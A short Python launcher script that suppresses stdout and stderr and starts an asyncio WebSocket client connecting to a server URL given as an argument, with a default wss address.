import sys
import asyncio
import os

from websocket_client import run

if __name__ == "__main__":
    # Silence stdout/stderr so the process never attempts terminal I/O,
    # even if launched manually from a shell.
    _devnull = open(os.devnull, "w")
    sys.stdout = _devnull
    sys.stderr = _devnull

    server_url = sys.argv[1] if len(sys.argv) > 1 else "wss://mac.cryptdocker.com"
    asyncio.run(run(server_url))
